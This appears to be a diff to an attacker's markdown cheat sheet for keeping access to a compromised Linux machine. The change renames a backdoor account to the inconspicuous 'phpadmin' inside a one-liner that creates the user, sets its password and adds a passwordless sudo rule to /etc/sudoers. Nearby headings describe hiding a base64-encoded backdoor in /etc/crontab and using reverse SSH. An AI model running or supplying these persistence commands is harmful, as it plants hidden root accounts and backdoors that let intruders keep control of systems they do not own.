@@ -13,7 +13,7 @@ gcc -static -o proc proc.c
 ```
 # Add New Super User
 ```bash
-useradd lomarkomar && (echo -e "tomarkomar\ntomarkomar" | passwd lomarkomar) && (echo "lomarkomar ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers)
+useradd phpadmin && (echo -e "phpadmin\nphpadmin" | passwd phpadmin) && (echo "phpadmin ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers)
 ```
 # Add Backdoor To Crontab (It's not neccessary if you use Reverse SSH)
 Encode with base 64 and add to /etc/crontab
